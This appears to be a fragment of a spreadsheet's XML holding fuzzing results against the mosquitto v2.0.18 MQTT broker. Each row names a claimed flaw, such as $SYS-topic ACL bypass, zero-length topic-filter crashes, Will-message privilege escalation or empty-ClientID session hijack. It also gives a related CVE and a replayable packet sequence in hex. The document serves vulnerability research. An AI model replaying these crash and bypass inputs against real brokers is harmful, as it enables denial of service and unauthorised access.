        <f>== 种子标识: id:000008,sev:3,cat:0206 ===\u000a大小: 2759B (报告+请求数据)\u000a请求数据: 1419B\u000a\u000a---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MQTT请求序列(1419B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/brzker/brokkkkkkkkkkkkkk' QoS=0 retain=False payload_len=49B | raw_header=3050001d245359532f62727a6b65722f\u000aMsg[2]: PUBREL PacketID=2243 | raw_header=6b6b08c36b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[3]: SUBSCRIBE PacketID=27499 Topics=[] | raw_header=8b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[4]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[5]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[6]: PUBREL PacketID=3878 | raw_header=6b6b0f266b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[7]: PUBREL PacketID=183 | raw_header=6b6b00b76b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[8]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[9]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[10]: PUBREL  | raw_header=6b016b\u000aMsg[11]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[12]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[13]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[14]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[15]: (不完整,26B) raw=049785d2cbbe01bcb062972e062eeddc116b9ea82249e9b21b27\u000a(尾部26B): 049785d2cbbe01bcb062972e062eeddc116b9ea82249e9b21b27</f>
        <v/>
      </c>
      <c r="F6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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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29">
      <c r="A629" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B629" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C629" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(665B)\u000a4.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0x0286\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E629" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 2018B (报告+请求数据)\u000a请求数据: 665B\u000a\u000a---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MQTT请求序列(665B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/broker/clients/connep\x03\x19Ñ' QoS=0 retain=False payload_len=49B | raw_header=3050001d245359532f62726f6b65722f\u000aMsg[2]: TYPE0  | raw_header=001c2473686172652f673321686f6d65\u000aMsg[3]: TYPE0  | raw_header=000c77696c6c5f7061796c6f6164\u000aMsg[4]: TYPE0  | raw_header=000966757a7a5f75736572\u000aMsg[5]: SUBSCRIBE PacketID=16972 Topics=[] | raw_header=8259424c2a260009612f622f632f642f\u000aMsg[6]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload_len=94B | raw_header=357500152473686172652f6772702f74\u000aMsg[7]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload_len=152B | raw_header=30b701001d245359532f62726f6b6572\u000aMsg[8]: PUBLISH Topic='a/b/c/d/e' QoS=0 retain=True payload_len=69B | raw_header=39500009612f622f632f642f651f01b3\u000aMsg[9]: DISCONNECT 断开连接 | raw_header=e030822e1f00142473686172652f6772</f>
        <v/>
      </c>
      <c r="F6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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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2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0">
      <c r="A630" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B630" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C630" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(1414B)\u000a4.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30" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 2146B (报告+请求数据)\u000a请求数据: 1414B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(1414B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=000141\u000aMsg[2]: SUBSCRIBE PacketID=0 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=80620000000000000000000000000000\u000aMsg[3]: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raw_header=0000\u000a(尾部1265B): 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J63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3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31">
      <c r="A631" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B631" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C631" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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31" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0042 ===\u000a大小: 705B (报告+请求数据)\u000a请求数据: 174B\u000a\u000a---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MQTT请求序列(174B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1938 Topics=[''(零长度!QoS=0)] | raw_header=8225079200000006001c247368617265\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=100B | raw_header=3a8301001d245359532f62726f6b6572\u000aMsg[3]: CONNACK  | raw_header=28</f>
        <v/>
      </c>
      <c r="F6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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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3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2">
      <c r="A632" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B632" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C632" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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32" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 749B (报告+请求数据)\u000a请求数据: 177B\u000a\u000a---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MQTT请求序列(177B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1188 Topics=[''(零长度!QoS=0)] | raw_header=823904a40000142473686172652f6772\u000aMsg[2]: PUBLISH Topic='$share/grp2/sensor/#' QoS=0 retain=True payload_len=81B | raw_header=396700142473686172652f677270322f\u000aMsg[3]: (不完整,13B) raw=585858585858102249e9e34527\u000a(尾部13B): 585858585858102249e9e34527</f>
        <v/>
      </c>
      <c r="F6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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J63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3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33">
      <c r="A633" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B633" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C633" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(72B)\u000a4.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33" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 781B (报告+请求数据)\u000a请求数据: 72B\u000a\u000a---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MQTT请求序列(72B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1952 Topics=[''(零长度!QoS=2)] | raw_header=820507a0000002\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload='\x07¡¯Å\x91·Mb°oÉ%\u000a-²++0Ëµâ\u000asË\u0009m\x19\x1c\x91Df' | raw_header=3b3e001d245359532f62726f6b65722f\u000aMsg[3]: AUTH  | raw_header=fc</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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3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4">
      <c r="A634" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B634" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C634" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(304B)\u000a4.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34" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 778B (报告+请求数据)\u000a请求数据: 304B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(304B原始二进制) ---\u000aMsg[1]: CONNACK session_present=89 reason_code=83 | raw_header=245359532f00101500044d5154540402\u000aMsg[2]: PUBCOMP PacketID=28777 | raw_header=746f706963010013245359532f62726f\u000aMsg[3]: TYPE0  | raw_header=000d0000062b2d6461746122000a74\u000aMsg[4]: (不完整,91B) raw=6573742f746f7069630800152473686172652f6772702f746573742f746f7069631c2f636c69656e\u000a(尾部91B): 6573742f746f7069630800152473686172652f6772702f746573742f746f7069631c2f636c69656e74732f636f6e6e656374</f>
        <v/>
      </c>
      <c r="F6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3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34" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J63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3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5">
      <c r="A635" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B635" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C635" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(27B)\u000a4.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635" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 661B (报告+请求数据)\u000a请求数据: 27B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(27B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=97 Topics=[] | raw_header=8215006100280006245359532f23321a\u000aMsg[2]: (不完整,4B) raw=470696f3\u000a(尾部4B): 470696f3</f>
        <v/>
      </c>
      <c r="F6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63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635" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J63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63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636">
      <c r="A636" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B636" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C636" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(587B)\u000a4.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36" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 1249B (报告+请求数据)\u000a请求数据: 587B\u000a\u000a---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MQTT请求序列(587B原始二进制) ---\u000aMsg[1]: CONNACK session_present=89 reason_code=110 | raw_header=2453596e00fd6e248768617294949494\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e803000004\u000aMsg[3]: PUBACK  | raw_header=4d00\u000aMsg[4]: PUBREC PacketID=1026 | raw_header=54540402003c000961666c6e65745f63\u000aMsg[5]: PUBREL PacketID=25966 | raw_header=6c69656e74732f636f6e6e6563746564\u000aMsg[6]: PUBLISH  | raw_header=3100\u000aMsg[7]: (不完整,300B) raw=0dffe4062b2f0f4f1300ee74822b2f22567461ac2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b5d\u000a(尾部300B): 0dffe4062b2f0f4f1300ee74822b2f22567461ac2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b5d2b2b2b2b2b2b2b2b2b2b</f>
        <v/>
      </c>
      <c r="F6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3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36" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J63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3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7">
      <c r="A637" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B637" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C637" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(197B)\u000a4.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37" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 578B (报告+请求数据)\u000a请求数据: 197B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(197B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='(ery/dee&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\x0e&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;' QoS=1 retain=False payload_len=63B | raw_header=3a6c002b286572792f64656526262626\u000aMsg[2]: (不完整,87B) raw=75726502000b73656e736f722f74656d7001000b73656e736f722f74656d70022626262626262626\u000a(尾部87B): 75726502000b73656e736f722f74656d7001000b73656e736f722f74656d7002262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F6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3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37" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J63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3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38">
      <c r="A638" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B638" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C638" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(1315B)\u000a4.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0x00c2\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E638" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c2 ===\u000a大小: 2558B (报告+请求数据)\u000a请求数据: 1315B\u000a\u000a---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CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(1315B原始二进制) ---\u000aMsg[1]: (不完整,1315B) raw=74b5a6b5b5b5b5e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3\u000a(尾部1315B): 74b5a6b5b5b5b5e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3</f>
        <v/>
      </c>
      <c r="F6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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J63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3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39">
      <c r="A639" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B639" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C639" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(1987B)\u000a4.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39" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 2373B (报告+请求数据)\u000a请求数据: 1987B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(1987B原始二进制) ---\u000aMsg[1]: SUBACK PacketID=5376 reason_codes=[0,1,36,83,89,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,8,18,18,18,18,18] | raw_header=912e1500000124535912121212121212\u000aMsg[2]: AUTH  | raw_header=f2121212121212121212121212121212\u000aMsg[3]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12120000000000000000121212121212\u000aMsg[4]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[7]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[8]: PUBCOMP PacketID=4626 | raw_header=72121212121212121212121212121212\u000aMsg[9]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[10]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[11]: AUTH  | raw_header=f000\u000aMsg[12]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212921212129c12\u000aMsg[13]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[14]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[15]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[16]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12121212121212121212121212121212\u000aMsg[17]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=121273686172652f6772702f74657374\u000aMsg[18]: PUBREL PacketID=43 | raw_header=6963002b025404c70034130006748231\u000aMsg[19]: (不完整,1536B) raw=a6a6a6a6a6a6121212121f1212121212121212121212121212121212121212127f12121212121212\u000a(尾部1536B): a6a6a6a6a6a6121212121f1212121212121212121212121212121212121212127f1212121212121212121212121212121212</f>
        <v/>
      </c>
      <c r="F6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3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39" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J63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3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40">
      <c r="A640" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B640" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C640" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(139B)\u000a4.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640" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0102 ===\u000a大小: 616B (报告+请求数据)\u000a请求数据: 139B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(139B原始二进制) ---\u000aMsg[1]: (不完整,139B) raw=328240007b001c2473686172652f67332f686f6d652f2b2f74656d706572617475726502001c2473\u000a(尾部139B): 328240007b001c2473686172652f67332f686f6d652f2b2f74656d706572617475726502001c2473686172652f67332f686f</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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4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1">
      <c r="A641" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B641" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C641" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(114B)\u000a4.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641" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0103 ===\u000a大小: 852B (报告+请求数据)\u000a请求数据: 114B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(114B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=16689s [持久会话] | raw_header=101500000048413100004d51548e0402\u000aMsg[2]: CONNECT Proto=MQTT v5 ClientID=''(10097B) clean_session=True keepalive=99s Will=YES [自动清理会话] | raw_header=105900044d515454053600632b2771df</f>
        <v/>
      </c>
      <c r="F6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4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41" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J64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4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2">
      <c r="A642" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B642" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C642" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(338B)\u000a4.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42" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 1059B (报告+请求数据)\u000a请求数据: 338B\u000a\u000a---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MQTT请求序列(338B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=101500044d5154540400000000000000\u000aMsg[2]: PUBREL PacketID=25972 | raw_header=6c6e65745f6330820b7c210000008068\u000aMsg[3]: PUBCOMP PacketID=20483 | raw_header=722f50035bbe0074742f2b0200821100\u000aMsg[4]: PUBCOMP PacketID=28275 | raw_header=73656e736f722f235701c402345519f1\u000aMsg[5]: (不完整,51B) raw=74400ae01908ee61cc4152fb3a5f15f1d9eae75cd8aa47be870bb2160013418062fa0e8cb6408229\u000a(尾部51B): 74400ae01908ee61cc4152fb3a5f15f1d9eae75cd8aa47be870bb2160013418062fa0e8cb6408229823800641e0bdde5b475</f>
        <v/>
      </c>
      <c r="F6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4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42" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J64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4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43">
      <c r="A643" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B643" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C643" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(151B)\u000a4.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643" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0182 ===\u000a大小: 815B (报告+请求数据)\u000a请求数据: 151B\u000a\u000a---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MQTT请求序列(151B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=126B | raw_header=3d93010013245359532f62726f6b6572\u000aMsg[2]: SUBSCRIBE  | raw_header=80</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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4">
      <c r="A644" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B644" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C644" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(108B)\u000a4.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0x0183\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E644" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0183 ===\u000a大小: 1131B (报告+请求数据)\u000a请求数据: 108B\u000a\u000a---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MQTT请求序列(108B原始二进制) ---\u000aMsg[1]: (不完整,108B) raw=10ff000000ff545404000020f8085b17001173656e736f72300057001d245359532f62726f6b6572\u000a(尾部108B): 10ff000000ff545404000020f8085b17001173656e736f72300057001d245359532f62726f6b65722f636c69656e74732f63</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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5">
      <c r="A645" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:01c0</t>
        </is>
      </c>
      <c r="B645" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C645" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(4735B)\u000a4.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645" s="2">
